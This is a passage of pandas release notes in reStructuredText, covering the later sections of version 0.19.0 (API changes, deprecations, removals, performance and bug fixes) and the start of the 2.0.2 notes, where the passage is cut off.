(:issue:`13853`)\n- Bug in ``SparseSeries.abs`` incorrectly keeps negative ``fill_value`` (:issue:`13853`)\n- Bug in single row slicing on multi-type ``SparseDataFrame`` s, types were previously forced to float (:issue:`13917`)\n- Bug in ``SparseSeries`` slicing changes integer dtype to float (:issue:`8292`)\n- Bug in ``SparseDataFarme`` comparison ops may raise ``TypeError`` (:issue:`13001`)\n- Bug in ``SparseDataFarme.isnull`` raises ``ValueError`` (:issue:`8276`)\n- Bug in ``SparseSeries`` representation with ``bool`` dtype may raise ``IndexError`` (:issue:`13110`)\n- Bug in ``SparseSeries`` and ``SparseDataFrame`` of ``bool`` or ``int64`` dtype may display its values like ``float64`` dtype (:issue:`13110`)\n- Bug in sparse indexing using ``SparseArray`` with ``bool`` dtype may return incorrect result  (:issue:`13985`)\n- Bug in ``SparseArray`` created from ``SparseSeries`` may lose ``dtype`` (:issue:`13999`)\n- Bug in ``SparseSeries`` comparison with dense returns normal ``Series`` rather than ``SparseSeries`` (:issue:`13999`)\n\n\n.. _whatsnew_0190.indexer_dtype:\n\nIndexer dtype changes\n^^^^^^^^^^^^^^^^^^^^^\n\n.. note::\n\n   This change only affects 64 bit python running on Windows, and only affects relatively advanced\n   indexing operations\n\nMethods such as ``Index.get_indexer`` that return an indexer array, coerce that array to a \"platform int\", so that it can be\ndirectly used in 3rd party library operations like ``numpy.take``.  Previously, a platform int was defined as ``np.int_``\nwhich corresponds to a C integer, but the correct type, and what is being used now, is ``np.intp``, which corresponds\nto the C integer size that can hold a pointer (:issue:`3033`, :issue:`13972`).\n\nThese types are the same on many platform, but for 64 bit python on Windows,\n``np.int_`` is 32 bits, and ``np.intp`` is 64 bits.  Changing this behavior improves performance for many\noperations on that platform.\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [1]: i = pd.Index(['a', 'b', 'c'])\n\n   In [2]: i.get_indexer(['b', 'b', 'c']).dtype\n   Out[2]: dtype('int32')\n\n**New behavior**:\n\n.. code-block:: ipython\n\n   In [1]: i = pd.Index(['a', 'b', 'c'])\n\n   In [2]: i.get_indexer(['b', 'b', 'c']).dtype\n   Out[2]: dtype('int64')\n\n\n.. _whatsnew_0190.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- ``Timestamp.to_pydatetime`` will issue a ``UserWarning`` when ``warn=True``, and the instance has a non-zero number of nanoseconds, previously this would print a message to stdout (:issue:`14101`).\n- ``Series.unique()`` with datetime and timezone now returns return array of ``Timestamp`` with timezone (:issue:`13565`).\n- ``Panel.to_sparse()`` will raise a ``NotImplementedError`` exception when called (:issue:`13778`).\n- ``Index.reshape()`` will raise a ``NotImplementedError`` exception when called (:issue:`12882`).\n- ``.filter()`` enforces mutual exclusion of the keyword arguments (:issue:`12399`).\n- ``eval``'s upcasting rules for ``float32`` types have been updated to be more consistent with NumPy's rules.  New behavior will not upcast to ``float64`` if you multiply a pandas ``float32`` object by a scalar float64 (:issue:`12388`).\n- An ``UnsupportedFunctionCall`` error is now raised if NumPy ufuncs like ``np.mean`` are called on groupby or resample objects (:issue:`12811`).\n- ``__setitem__`` will no longer apply a callable rhs as a function instead of storing it. Call ``where`` directly to get the previous behavior (:issue:`13299`).\n- Calls to ``.sample()`` will respect the random seed set via ``numpy.random.seed(n)`` (:issue:`13161`)\n- ``Styler.apply`` is now more strict about the outputs your function must return. For ``axis=0`` or ``axis=1``, the output shape must be identical. For ``axis=None``, the output must be a DataFrame with identical columns and index labels (:issue:`13222`).\n- ``Float64Index.astype(int)`` will now raise ``ValueError`` if ``Float64Index`` contains ``NaN`` values (:issue:`13149`)\n- ``TimedeltaIndex.astype(int)`` and ``DatetimeIndex.astype(int)`` will now return ``Int64Index`` instead of ``np.array`` (:issue:`13209`)\n- Passing ``Period`` with multiple frequencies to normal ``Index`` now returns ``Index`` with ``object`` dtype (:issue:`13664`)\n- ``PeriodIndex.fillna`` with ``Period`` has different freq now coerces to ``object`` dtype (:issue:`13664`)\n- Faceted boxplots from ``DataFrame.boxplot(by=col)`` now return a ``Series`` when ``return_type`` is not None. Previously these returned an ``OrderedDict``. Note that when ``return_type=None``, the default, these still return a 2-D NumPy array (:issue:`12216`, :issue:`7096`).\n- ``pd.read_hdf`` will now raise a ``ValueError`` instead of ``KeyError``, if a mode other than ``r``, ``r+`` and ``a`` is supplied. (:issue:`13623`)\n- ``pd.read_csv()``, ``pd.read_table()``, and ``pd.read_hdf()`` raise the builtin ``FileNotFoundError`` exception for Python 3.x when called on a nonexistent file; this is back-ported as ``IOError`` in Python 2.x (:issue:`14086`)\n- More informative exceptions are passed through the csv parser. The exception type would now be the original exception type instead of ``CParserError`` (:issue:`13652`).\n- ``pd.read_csv()`` in the C engine will now issue a ``ParserWarning`` or raise a ``ValueError`` when ``sep`` encoded is more than one character long (:issue:`14065`)\n- ``DataFrame.values`` will now return ``float64`` with a ``DataFrame`` of mixed ``int64`` and ``uint64`` dtypes, conforming to ``np.find_common_type`` (:issue:`10364`, :issue:`13917`)\n- ``.groupby.groups`` will now return a dictionary of ``Index`` objects, rather than a dictionary of ``np.ndarray`` or ``lists`` (:issue:`14293`)\n\n.. _whatsnew_0190.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n- ``Series.reshape`` and ``Categorical.reshape`` have been deprecated and will be removed in a subsequent release (:issue:`12882`, :issue:`12882`)\n- ``PeriodIndex.to_datetime`` has been deprecated in favor of ``PeriodIndex.to_timestamp`` (:issue:`8254`)\n- ``Timestamp.to_datetime`` has been deprecated in favor of ``Timestamp.to_pydatetime`` (:issue:`8254`)\n- ``Index.to_datetime`` and ``DatetimeIndex.to_datetime`` have been deprecated in favor of ``pd.to_datetime`` (:issue:`8254`)\n- ``pandas.core.datetools`` module has been deprecated and will be removed in a subsequent release (:issue:`14094`)\n- ``SparseList`` has been deprecated and will be removed in a future version (:issue:`13784`)\n- ``DataFrame.to_html()`` and ``DataFrame.to_latex()`` have dropped the ``colSpace`` parameter in favor of ``col_space`` (:issue:`13857`)\n- ``DataFrame.to_sql()`` has deprecated the ``flavor`` parameter, as it is superfluous when SQLAlchemy is not installed (:issue:`13611`)\n- Deprecated ``read_csv`` keywords:\n\n  - ``compact_ints`` and ``use_unsigned`` have been deprecated and will be removed in a future version (:issue:`13320`)\n  - ``buffer_lines`` has been deprecated and will be removed in a future version (:issue:`13360`)\n  - ``as_recarray`` has been deprecated and will be removed in a future version (:issue:`13373`)\n  - ``skip_footer`` has been deprecated in favor of ``skipfooter`` and will be removed in a future version (:issue:`13349`)\n\n- top-level ``pd.ordered_merge()`` has been renamed to ``pd.merge_ordered()`` and the original name will be removed in a future version (:issue:`13358`)\n- ``Timestamp.offset`` property (and named arg in the constructor), has been deprecated in favor of ``freq`` (:issue:`12160`)\n- ``pd.tseries.util.pivot_annual`` is deprecated. Use ``pivot_table`` as alternative, an example is :ref:`here <cookbook.pivot>` (:issue:`736`)\n- ``pd.tseries.util.isleapyear`` has been deprecated and will be removed in a subsequent release. Datetime-likes now have a ``.is_leap_year`` property (:issue:`13727`)\n- ``Panel4D`` and ``PanelND`` constructors are deprecated and will be removed in a future version. The recommended way to represent these types of n-dimensional data are with the `xarray package <http://xarray.pydata.org/en/stable/>`__. pandas provides a :meth:`~Panel4D.to_xarray` method to automate this conversion (:issue:`13564`).\n- ``pandas.tseries.frequencies.get_standard_freq`` is deprecated. Use  ``pandas.tseries.frequencies.to_offset(freq).rule_code`` instead (:issue:`13874`)\n- ``pandas.tseries.frequencies.to_offset``'s ``freqstr`` keyword is deprecated in favor of ``freq`` (:issue:`13874`)\n- ``Categorical.from_array`` has been deprecated and will be removed in a future version (:issue:`13854`)\n\n.. _whatsnew_0190.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- The ``SparsePanel`` class has been removed (:issue:`13778`)\n- The ``pd.sandbox`` module has been removed in favor of the external library ``pandas-qt`` (:issue:`13670`)\n- The ``pandas.io.data`` and ``pandas.io.wb`` modules are removed in favor of\n  the `pandas-datareader package <https://github.com/pydata/pandas-datareader>`__ (:issue:`13724`).\n- The ``pandas.tools.rplot`` module has been removed in favor of\n  the `seaborn package <https://github.com/mwaskom/seaborn>`__ (:issue:`13855`)\n- ``DataFrame.to_csv()`` has dropped the ``engine`` parameter, as was deprecated in 0.17.1 (:issue:`11274`, :issue:`13419`)\n- ``DataFrame.to_dict()`` has dropped the ``outtype`` parameter in favor of ``orient`` (:issue:`13627`, :issue:`8486`)\n- ``pd.Categorical`` has dropped setting of the ``ordered`` attribute directly in favor of the ``set_ordered`` method (:issue:`13671`)\n- ``pd.Categorical`` has dropped the ``levels`` attribute in favor of ``categories`` (:issue:`8376`)\n- ``DataFrame.to_sql()`` has dropped the ``mysql`` option for the ``flavor`` parameter (:issue:`13611`)\n- ``Panel.shift()`` has dropped the ``lags`` parameter in favor of ``periods`` (:issue:`14041`)\n- ``pd.Index`` has dropped the ``diff`` method in favor of ``difference`` (:issue:`13669`)\n- ``pd.DataFrame`` has dropped the ``to_wide`` method in favor of ``to_panel`` (:issue:`14039`)\n- ``Series.to_csv`` has dropped the ``nanRep`` parameter in favor of ``na_rep`` (:issue:`13804`)\n- ``Series.xs``, ``DataFrame.xs``, ``Panel.xs``, ``Panel.major_xs``, and ``Panel.minor_xs`` have dropped the ``copy`` parameter (:issue:`13781`)\n- ``str.split`` has dropped the ``return_type`` parameter in favor of ``expand`` (:issue:`13701`)\n- Removal of the legacy time rules (offset aliases), deprecated since 0.17.0 (this has been alias since 0.8.0) (:issue:`13590`, :issue:`13868`). Now legacy time rules raises ``ValueError``. For the list of currently supported offsets, see :ref:`here <timeseries.offset_aliases>`.\n- The default value for the ``return_type`` parameter for ``DataFrame.plot.box`` and ``DataFrame.boxplot`` changed from ``None`` to ``\"axes\"``. These methods will now return a matplotlib axes by default instead of a dictionary of artists. See :ref:`here <visualization.box.return>` (:issue:`6581`).\n- The ``tquery`` and ``uquery`` functions in the ``pandas.io.sql`` module are removed (:issue:`5950`).\n\n\n.. _whatsnew_0190.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improved performance of sparse ``IntIndex.intersect`` (:issue:`13082`)\n- Improved performance of sparse arithmetic with ``BlockIndex`` when the number of blocks are large, though recommended to use ``IntIndex`` in such cases (:issue:`13082`)\n- Improved performance of ``DataFrame.quantile()`` as it now operates per-block (:issue:`11623`)\n- Improved performance of float64 hash table operations, fixing some very slow indexing and groupby operations in python 3 (:issue:`13166`, :issue:`13334`)\n- Improved performance of ``DataFrameGroupBy.transform`` (:issue:`12737`)\n- Improved performance of ``Index`` and ``Series`` ``.duplicated`` (:issue:`10235`)\n- Improved performance of ``Index.difference`` (:issue:`12044`)\n- Improved performance of ``RangeIndex.is_monotonic_increasing`` and ``is_monotonic_decreasing`` (:issue:`13749`)\n- Improved performance of datetime string parsing in ``DatetimeIndex`` (:issue:`13692`)\n- Improved performance of hashing ``Period`` (:issue:`12817`)\n- Improved performance of ``factorize`` of datetime with timezone (:issue:`13750`)\n- Improved performance of by lazily creating indexing hashtables on larger Indexes (:issue:`14266`)\n- Improved performance of ``groupby.groups`` (:issue:`14293`)\n- Unnecessary materializing of a MultiIndex when introspecting for memory usage (:issue:`14308`)\n\n.. _whatsnew_0190.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in ``groupby().shift()``, which could cause a segfault or corruption in rare circumstances when grouping by columns with missing values (:issue:`13813`)\n- Bug in ``groupby().cumsum()`` calculating ``cumprod`` when ``axis=1``. (:issue:`13994`)\n- Bug in ``pd.to_timedelta()`` in which the ``errors`` parameter was not being respected (:issue:`13613`)\n- Bug in ``io.json.json_normalize()``, where non-ascii keys raised an exception (:issue:`13213`)\n- Bug when passing a not-default-indexed ``Series`` as ``xerr`` or ``yerr`` in ``.plot()`` (:issue:`11858`)\n- Bug in area plot draws legend incorrectly if subplot is enabled or legend is moved after plot (matplotlib 1.5.0 is required to draw area plot legend properly) (:issue:`9161`, :issue:`13544`)\n- Bug in ``DataFrame`` assignment with an object-dtyped ``Index`` where the resultant column is mutable to the original object. (:issue:`13522`)\n- Bug in matplotlib ``AutoDataFormatter``; this restores the second scaled formatting and re-adds micro-second scaled formatting (:issue:`13131`)\n- Bug in selection from a ``HDFStore`` with a fixed format and ``start`` and/or ``stop`` specified will now return the selected range (:issue:`8287`)\n- Bug in ``Categorical.from_codes()`` where an unhelpful error was raised when an invalid ``ordered`` parameter was passed in (:issue:`14058`)\n- Bug in ``Series`` construction from a tuple of integers on windows not returning default dtype (int64) (:issue:`13646`)\n- Bug in ``TimedeltaIndex`` addition with a Datetime-like object where addition overflow was not being caught (:issue:`14068`)\n- Bug in ``.groupby(..).resample(..)`` when the same object is called multiple times (:issue:`13174`)\n- Bug in ``.to_records()`` when index name is a unicode string (:issue:`13172`)\n- Bug in calling ``.memory_usage()`` on object which doesn't implement (:issue:`12924`)\n- Regression in ``Series.quantile`` with nans (also shows up in ``.median()`` and ``.describe()`` ); furthermore now names the ``Series`` with the quantile (:issue:`13098`, :issue:`13146`)\n- Bug in ``SeriesGroupBy.transform`` with datetime values and missing groups (:issue:`13191`)\n- Bug where empty ``Series`` were incorrectly coerced in datetime-like numeric operations (:issue:`13844`)\n- Bug in ``Categorical`` constructor when passed a ``Categorical`` containing datetimes with timezones (:issue:`14190`)\n- Bug in ``Series.str.extractall()`` with ``str`` index raises ``ValueError``  (:issue:`13156`)\n- Bug in ``Series.str.extractall()`` with single group and quantifier  (:issue:`13382`)\n- Bug in ``DatetimeIndex`` and ``Period`` subtraction raises ``ValueError`` or ``AttributeError`` rather than ``TypeError`` (:issue:`13078`)\n- Bug in ``Index`` and ``Series`` created with ``NaN`` and ``NaT`` mixed data may not have ``datetime64`` dtype  (:issue:`13324`)\n- Bug in ``Index`` and ``Series`` may ignore ``np.datetime64('nat')`` and ``np.timdelta64('nat')`` to infer dtype (:issue:`13324`)\n- Bug in ``PeriodIndex`` and ``Period`` subtraction raises ``AttributeError`` (:issue:`13071`)\n- Bug in ``PeriodIndex`` construction returning a ``float64`` index in some circumstances (:issue:`13067`)\n- Bug in ``.resample(..)`` with a ``PeriodIndex`` not changing its ``freq`` appropriately when empty (:issue:`13067`)\n- Bug in ``.resample(..)`` with a ``PeriodIndex`` not retaining its type or name with an empty ``DataFrame`` appropriately when empty (:issue:`13212`)\n- Bug in ``groupby(..).apply(..)`` when the passed function returns scalar values per group (:issue:`13468`).\n- Bug in ``groupby(..).resample(..)`` where passing some keywords would raise an exception (:issue:`13235`)\n- Bug in ``.tz_convert`` on a tz-aware ``DateTimeIndex`` that relied on index being sorted for correct results (:issue:`13306`)\n- Bug in ``.tz_localize`` with ``dateutil.tz.tzlocal`` may return incorrect result (:issue:`13583`)\n- Bug in ``DatetimeTZDtype`` dtype with ``dateutil.tz.tzlocal`` cannot be regarded as valid dtype (:issue:`13583`)\n- Bug in ``pd.read_hdf()`` where attempting to load an HDF file with a single dataset, that had one or more categorical columns, failed unless the key argument was set to the name of the dataset. (:issue:`13231`)\n- Bug in ``.rolling()`` that allowed a negative integer window in construction of the ``Rolling()`` object, but would later fail on aggregation (:issue:`13383`)\n- Bug in ``Series`` indexing with tuple-valued data and a numeric index (:issue:`13509`)\n- Bug in printing ``pd.DataFrame`` where unusual elements with the ``object`` dtype were causing segfaults (:issue:`13717`)\n- Bug in ranking ``Series`` which could result in segfaults (:issue:`13445`)\n- Bug in various index types, which did not propagate the name of passed index (:issue:`12309`)\n- Bug in ``DatetimeIndex``, which did not honour the ``copy=True`` (:issue:`13205`)\n- Bug in ``DatetimeIndex.is_normalized`` returns incorrectly for normalized date_range in case of local timezones (:issue:`13459`)\n- Bug in ``pd.concat`` and ``.append`` may coerces ``datetime64`` and ``timedelta`` to ``object`` dtype containing python built-in ``datetime`` or ``timedelta`` rather than ``Timestamp`` or ``Timedelta`` (:issue:`13626`)\n- Bug in ``PeriodIndex.append`` may raises ``AttributeError`` when the result is ``object`` dtype (:issue:`13221`)\n- Bug in ``CategoricalIndex.append`` may accept normal ``list`` (:issue:`13626`)\n- Bug in ``pd.concat`` and ``.append`` with the same timezone get reset to UTC (:issue:`7795`)\n- Bug in ``Series`` and ``DataFrame`` ``.append`` raises ``AmbiguousTimeError`` if data contains datetime near DST boundary (:issue:`13626`)\n- Bug in ``DataFrame.to_csv()`` in which float values were being quoted even though quotations were specified for non-numeric values only (:issue:`12922`, :issue:`13259`)\n- Bug in ``DataFrame.describe()`` raising ``ValueError`` with only boolean columns (:issue:`13898`)\n- Bug in ``MultiIndex`` slicing where extra elements were returned when level is non-unique (:issue:`12896`)\n- Bug in ``.str.replace`` does not raise ``TypeError`` for invalid replacement (:issue:`13438`)\n- Bug in ``MultiIndex.from_arrays`` which didn't check for input array lengths matching (:issue:`13599`)\n- Bug in ``cartesian_product`` and ``MultiIndex.from_product`` which may raise with empty input arrays (:issue:`12258`)\n- Bug in ``pd.read_csv()`` which may cause a segfault or corruption when iterating in large chunks over a stream/file under rare circumstances (:issue:`13703`)\n- Bug in ``pd.read_csv()`` which caused errors to be raised when a dictionary containing scalars is passed in for ``na_values`` (:issue:`12224`)\n- Bug in ``pd.read_csv()`` which caused BOM files to be incorrectly parsed by not ignoring the BOM (:issue:`4793`)\n- Bug in ``pd.read_csv()`` with ``engine='python'`` which raised errors when a numpy array was passed in for ``usecols`` (:issue:`12546`)\n- Bug in ``pd.read_csv()`` where the index columns were being incorrectly parsed when parsed as dates with a ``thousands`` parameter (:issue:`14066`)\n- Bug in ``pd.read_csv()`` with ``engine='python'`` in which ``NaN`` values weren't being detected after data was converted to numeric values (:issue:`13314`)\n- Bug in ``pd.read_csv()`` in which the ``nrows`` argument was not properly validated for both engines (:issue:`10476`)\n- Bug in ``pd.read_csv()`` with ``engine='python'`` in which infinities of mixed-case forms were not being interpreted properly (:issue:`13274`)\n- Bug in ``pd.read_csv()`` with ``engine='python'`` in which trailing ``NaN`` values were not being parsed (:issue:`13320`)\n- Bug in ``pd.read_csv()`` with ``engine='python'`` when reading from a ``tempfile.TemporaryFile`` on Windows with Python 3 (:issue:`13398`)\n- Bug in ``pd.read_csv()`` that prevents ``usecols`` kwarg from accepting single-byte unicode strings (:issue:`13219`)\n- Bug in ``pd.read_csv()`` that prevents ``usecols`` from being an empty set (:issue:`13402`)\n- Bug in ``pd.read_csv()`` in the C engine where the NULL character was not being parsed as NULL (:issue:`14012`)\n- Bug in ``pd.read_csv()`` with ``engine='c'`` in which NULL ``quotechar`` was not accepted even though ``quoting`` was specified as ``None`` (:issue:`13411`)\n- Bug in ``pd.read_csv()`` with ``engine='c'`` in which fields were not properly cast to float when quoting was specified as non-numeric (:issue:`13411`)\n- Bug in ``pd.read_csv()`` in Python 2.x with non-UTF8 encoded, multi-character separated data (:issue:`3404`)\n- Bug in ``pd.read_csv()``, where aliases for utf-xx (e.g. UTF-xx, UTF_xx, utf_xx) raised UnicodeDecodeError (:issue:`13549`)\n- Bug in ``pd.read_csv``, ``pd.read_table``, ``pd.read_fwf``, ``pd.read_stata`` and ``pd.read_sas`` where files were opened by parsers but not closed if both ``chunksize`` and ``iterator`` were ``None``. (:issue:`13940`)\n- Bug in ``StataReader``, ``StataWriter``, ``XportReader`` and ``SAS7BDATReader`` where a file was not properly closed when an error was raised. (:issue:`13940`)\n- Bug in ``pd.pivot_table()`` where ``margins_name`` is ignored when ``aggfunc`` is a list (:issue:`13354`)\n- Bug in ``pd.Series.str.zfill``, ``center``, ``ljust``, ``rjust``, and ``pad`` when passing non-integers, did not raise ``TypeError`` (:issue:`13598`)\n- Bug in checking for any null objects in a ``TimedeltaIndex``, which always returned ``True`` (:issue:`13603`)\n- Bug in ``Series`` arithmetic raises ``TypeError`` if it contains datetime-like as ``object`` dtype (:issue:`13043`)\n- Bug ``Series.isnull()`` and ``Series.notnull()`` ignore ``Period('NaT')``  (:issue:`13737`)\n- Bug ``Series.fillna()`` and ``Series.dropna()`` don't affect to ``Period('NaT')``  (:issue:`13737`\n- Bug in ``.fillna(value=np.nan)`` incorrectly raises ``KeyError`` on a ``category`` dtyped ``Series`` (:issue:`14021`)\n- Bug in extension dtype creation where the created types were not is/identical (:issue:`13285`)\n- Bug in ``.resample(..)`` where incorrect warnings were triggered by IPython introspection (:issue:`13618`)\n- Bug in ``NaT`` - ``Period`` raises ``AttributeError`` (:issue:`13071`)\n- Bug in ``Series`` comparison may output incorrect result if rhs contains ``NaT`` (:issue:`9005`)\n- Bug in ``Series`` and ``Index`` comparison may output incorrect result if it contains ``NaT`` with ``object`` dtype (:issue:`13592`)\n- Bug in ``Period`` addition raises ``TypeError`` if ``Period`` is on right hand side (:issue:`13069`)\n- Bug in ``Period`` and ``Series`` or ``Index`` comparison raises ``TypeError`` (:issue:`13200`)\n- Bug in ``pd.set_eng_float_format()`` that would prevent NaN and Inf from formatting (:issue:`11981`)\n- Bug in ``.unstack`` with ``Categorical`` dtype resets ``.ordered`` to ``True`` (:issue:`13249`)\n- Clean some compile time warnings in datetime parsing (:issue:`13607`)\n- Bug in ``factorize`` raises ``AmbiguousTimeError`` if data contains datetime near DST boundary (:issue:`13750`)\n- Bug in ``.set_index`` raises ``AmbiguousTimeError`` if new index contains DST boundary and multi levels (:issue:`12920`)\n- Bug in ``.shift`` raises ``AmbiguousTimeError`` if data contains datetime near DST boundary (:issue:`13926`)\n- Bug in ``pd.read_hdf()`` returns incorrect result when a ``DataFrame`` with a ``categorical`` column and a query which doesn't match any values (:issue:`13792`)\n- Bug in ``.iloc`` when indexing with a non lexsorted MultiIndex (:issue:`13797`)\n- Bug in ``.loc`` when indexing with date strings in a reverse sorted ``DatetimeIndex`` (:issue:`14316`)\n- Bug in ``Series`` comparison operators when dealing with zero dim NumPy arrays (:issue:`13006`)\n- Bug in ``.combine_first`` may return incorrect ``dtype`` (:issue:`7630`, :issue:`10567`)\n- Bug in ``groupby`` where ``apply`` returns different result depending on whether first result is ``None`` or not (:issue:`12824`)\n- Bug in ``groupby(..).nth()`` where the group key is included inconsistently if called after ``.head()/.tail()`` (:issue:`12839`)\n- Bug in ``.to_html``, ``.to_latex`` and ``.to_string`` silently ignore custom datetime formatter passed through the ``formatters`` key word (:issue:`10690`)\n- Bug in ``DataFrame.iterrows()``, not yielding a ``Series`` subclasse if defined (:issue:`13977`)\n- Bug in ``pd.to_numeric`` when ``errors='coerce'`` and input contains non-hashable objects (:issue:`13324`)\n- Bug in invalid ``Timedelta`` arithmetic and comparison may raise ``ValueError`` rather than ``TypeError`` (:issue:`13624`)\n- Bug in invalid datetime parsing in ``to_datetime`` and ``DatetimeIndex`` may raise ``TypeError`` rather than ``ValueError`` (:issue:`11169`, :issue:`11287`)\n- Bug in ``Index`` created with tz-aware ``Timestamp`` and mismatched ``tz`` option incorrectly coerces timezone (:issue:`13692`)\n- Bug in ``DatetimeIndex`` with nanosecond frequency does not include timestamp specified with ``end`` (:issue:`13672`)\n- Bug in ``Series`` when setting a slice with a ``np.timedelta64`` (:issue:`14155`)\n- Bug in ``Index`` raises ``OutOfBoundsDatetime`` if ``datetime`` exceeds ``datetime64[ns]`` bounds, rather than coercing to ``object`` dtype (:issue:`13663`)\n- Bug in ``Index`` may ignore specified ``datetime64`` or ``timedelta64`` passed as ``dtype``  (:issue:`13981`)\n- Bug in ``RangeIndex`` can be created without no arguments rather than raises ``TypeError`` (:issue:`13793`)\n- Bug in ``.value_counts()`` raises ``OutOfBoundsDatetime`` if data exceeds ``datetime64[ns]`` bounds (:issue:`13663`)\n- Bug in ``DatetimeIndex`` may raise ``OutOfBoundsDatetime`` if input ``np.datetime64`` has other unit than ``ns`` (:issue:`9114`)\n- Bug in ``Series`` creation with ``np.datetime64`` which has other unit than ``ns`` as ``object`` dtype results in incorrect values (:issue:`13876`)\n- Bug in ``resample`` with timedelta data where data was casted to float (:issue:`13119`).\n- Bug in ``pd.isnull()`` ``pd.notnull()`` raise ``TypeError`` if input datetime-like has other unit than ``ns`` (:issue:`13389`)\n- Bug in ``pd.merge()`` may raise ``TypeError`` if input datetime-like has other unit than ``ns`` (:issue:`13389`)\n- Bug in ``HDFStore``/``read_hdf()`` discarded ``DatetimeIndex.name`` if ``tz`` was set (:issue:`13884`)\n- Bug in ``Categorical.remove_unused_categories()`` changes ``.codes`` dtype to platform int (:issue:`13261`)\n- Bug in ``groupby`` with ``as_index=False`` returns all NaN's when grouping on multiple columns including a categorical one (:issue:`13204`)\n- Bug in ``df.groupby(...)[...]`` where getitem with ``Int64Index`` raised an error (:issue:`13731`)\n- Bug in the CSS classes assigned to ``DataFrame.style`` for index names. Previously they were assigned ``\"col_heading level<n> col<c>\"`` where ``n`` was the number of levels + 1. Now they are assigned ``\"index_name level<n>\"``, where ``n`` is the correct level for that MultiIndex.\n- Bug where ``pd.read_gbq()`` could throw ``ImportError: No module named discovery`` as a result of a naming conflict with another python package called apiclient  (:issue:`13454`)\n- Bug in ``Index.union`` returns an incorrect result with a named empty index (:issue:`13432`)\n- Bugs in ``Index.difference`` and ``DataFrame.join`` raise in Python3 when using mixed-integer indexes (:issue:`13432`, :issue:`12814`)\n- Bug in subtract tz-aware ``datetime.datetime`` from tz-aware ``datetime64`` series (:issue:`14088`)\n- Bug in ``.to_excel()`` when DataFrame contains a MultiIndex which contains a label with a NaN value (:issue:`13511`)\n- Bug in invalid frequency offset string like \"D1\", \"-2-3H\" may not raise ``ValueError`` (:issue:`13930`)\n- Bug in ``concat`` and ``groupby`` for hierarchical frames with ``RangeIndex`` levels (:issue:`13542`).\n- Bug in ``Series.str.contains()`` for Series containing only ``NaN`` values of ``object`` dtype (:issue:`14171`)\n- Bug in ``agg()`` function on groupby dataframe changes dtype of ``datetime64[ns]`` column to ``float64`` (:issue:`12821`)\n- Bug in using NumPy ufunc with ``PeriodIndex`` to add or subtract integer raise ``IncompatibleFrequency``. Note that using standard operator like ``+`` or ``-`` is recommended, because standard operators use more efficient path (:issue:`13980`)\n- Bug in operations on ``NaT`` returning ``float`` instead of ``datetime64[ns]`` (:issue:`12941`)\n- Bug in ``Series`` flexible arithmetic methods (like ``.add()``) raises ``ValueError`` when ``axis=None`` (:issue:`13894`)\n- Bug in ``DataFrame.to_csv()`` with ``MultiIndex`` columns in which a stray empty line was added (:issue:`6618`)\n- Bug in ``DatetimeIndex``, ``TimedeltaIndex`` and ``PeriodIndex.equals()`` may return ``True`` when input isn't ``Index`` but contains the same values (:issue:`13107`)\n- Bug in assignment against datetime with timezone may not work if it contains datetime near DST boundary (:issue:`14146`)\n- Bug in ``pd.eval()`` and ``HDFStore`` query truncating long float literals with python 2 (:issue:`14241`)\n- Bug in ``Index`` raises ``KeyError`` displaying incorrect column when column is not in the df and columns contains duplicate values (:issue:`13822`)\n- Bug in ``Period`` and ``PeriodIndex`` creating wrong dates when frequency has combined offset aliases (:issue:`13874`)\n- Bug in ``.to_string()`` when called with an integer ``line_width`` and ``index=False`` raises an UnboundLocalError exception because ``idx`` referenced before assignment.\n- Bug in ``eval()`` where the ``resolvers`` argument would not accept a list (:issue:`14095`)\n- Bugs in ``stack``, ``get_dummies``, ``make_axis_dummies`` which don't preserve categorical dtypes in (multi)indexes (:issue:`13854`)\n- ``PeriodIndex`` can now accept ``list`` and ``array`` which contains ``pd.NaT`` (:issue:`13430`)\n- Bug in ``df.groupby`` where ``.median()`` returns arbitrary values if grouped dataframe contains empty bins (:issue:`13629`)\n- Bug in ``Index.copy()`` where ``name`` parameter was ignored (:issue:`14302`)\n\n\n.. _whatsnew_0.19.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.18.1..v0.19.0\n\n\n.. _whatsnew_202:\n\nWhat's new in 2.0.2 (May 29, 2023)\n-----------------------------------\n\nThese are the changes in pandas 2.0.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_202.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed performance regression in :meth:`GroupBy.apply` (:issue:`53195`)\n- Fixed regression in :func:`merge` on Windows when dtype is ``np.intc`` (:issue:`52451`)\n- Fixed regression in :func:`read_sql` dropping columns with duplicated column names (:issue:`53117`)\n- Fixed regression in :meth:`DataFrame.loc` losing :class:`MultiIndex` name when enlarging object (:issue:`53053`)\n- Fixed regression in :meth:`DataFrame.to_string` printing a backslash at the end of the first row of data, instead of headers, when the DataFrame doesn't fit the line width (:issue:`53054`)\n- Fixed regression in :meth:`MultiIndex.join` returning levels in wrong order (:issue:`53093`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_202.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :class:`.arrays.ArrowExtensionArray` incorrectly assigning ``dict`` instead of ``list`` for ``.type`` with ``pyarrow.map_`` and raising a ``NotImplementedError`` with ``pyarrow.struct`` (:issue:`53328`)\n- Bug in :func:`api.interchange.from_dataframe` was raising ``IndexError`` on empty categorical data (:issue:`53077`)\n- Bug in :func:`api.interchange.from_dataframe` was returning :class:`DataFrame`'s of incorrect sizes when called on slices (:issue:`52824`)\n- Bug in :func:`api.interchange.from_dataframe` was unnecessarily raising on bitmasks (:issue:`49888`)\n- Bug in :func:`merge` when merging on datetime columns on different resolutions (:issue:`53200`)\n- Bug in :func:`read_csv` raising ``OverflowError`` for ``engine=\"pyarrow\"`` and ``parse_dates`` set (:issue:`53295`)\n- Bug in :func:`to_datetime` was inferring format to contain ``\"%H\"`` instead of ``\"%I\"`` if date contained \"AM\" / \"PM\" tokens (:issue:`53147`)\n- Bug in :func:`to_timedelta` was raising ``ValueError`` with ``pandas.NA`` (:issue:`52909`)\n- Bug in 